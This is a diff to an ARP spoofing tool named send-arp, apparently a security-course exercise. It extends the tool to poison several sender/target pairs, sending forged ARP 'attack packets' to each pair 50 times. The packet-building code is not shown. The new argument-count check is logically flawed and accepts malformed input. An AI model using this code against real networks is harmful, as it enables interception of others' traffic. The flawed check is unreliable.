@@ -22,7 +22,6 @@ void usage() {
 	printf("sample: send-arp wlan0 192.168.0.152 192.168.0.1\n");
 }
 
-
 void getMyInfo(Mac* myMac, Ip* myIP, const char* dev) {
 	int fd = socket(AF_INET, SOCK_DGRAM, 0);
 	if (fd < 0) {
@@ -137,25 +136,33 @@ int main(int argc, char* argv[]) {
 
 	const char* dev = argv[1];
 	
-	if (argc != 4) {
+	if ( (argc < 4) && (argc%2 != 0) ) {
 		usage();
 		exit(1);
 	}
+
 	Mac myMac;
 	Ip myIP;
 	getMyInfo(&myMac, &myIP, dev);
 
-	Mac senderMac = Mac();
-	Ip senderIP = Ip(argv[2]);
-	getSenderMac(&senderMac, senderIP, myMac, myIP, dev);
+	int s = argc / 2 - 1;
 
-	Ip receiverIP = Ip(argv[3]);
+	Mac senderMac[s];
+	Ip senderIP[s];
+	Ip receiverIP[s];
 
-	for (int i = 0; i < 50; i++) {
-		sendAttackPacket(senderMac, myMac, senderIP, receiverIP, dev);
+	for(int i = 0; i < s; i++) {
+		senderMac[i] = Mac();
+		senderIP[i] = Ip(argv[2 * i + 2]);
+		getSenderMac(&senderMac[i], senderIP[i], myMac, myIP, dev);
+		receiverIP[i] = Ip(argv[2 * i + 3]);
+	}
+	for(int j = 0; j < 50; j++) {
+		for (int i = 0; i < s; i++) 
+			sendAttackPacket(senderMac[i], myMac, senderIP[i], receiverIP[i], dev);
+
 		sleep(1);
 	}
-
 	return 0; 
 }
 
